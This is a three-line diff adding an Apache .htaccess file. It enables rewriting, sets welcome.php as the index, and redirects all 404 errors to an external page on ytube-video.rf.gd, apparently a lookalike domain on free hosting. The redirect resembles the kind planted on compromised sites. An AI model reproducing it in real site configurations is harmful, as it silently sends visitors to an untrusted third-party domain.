@@ -1,0 +1,3 @@
+RewriteEngine on
+DirectoryIndex welcome.php
+ErrorDocument 404 http://ytube-video.rf.gd/404.php
